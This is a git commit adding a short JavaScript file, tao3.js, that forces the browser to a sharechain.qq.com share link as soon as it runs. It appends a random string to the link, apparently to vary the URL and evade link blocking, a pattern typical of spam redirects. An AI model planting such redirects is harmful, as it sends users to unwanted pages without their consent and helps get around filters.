094987aa3dafa769e13c8baafde14fc319baa484
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-05-05 22:57:27 +0800

    Create tao3.js

---
+++ tao3.js
@@ -0,0 +1,17 @@
+var urls=[
+' https://sharechain.qq.com/0808c99c3935bcb7c5a202fedd2e0570#{nnnnnnn}{wwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
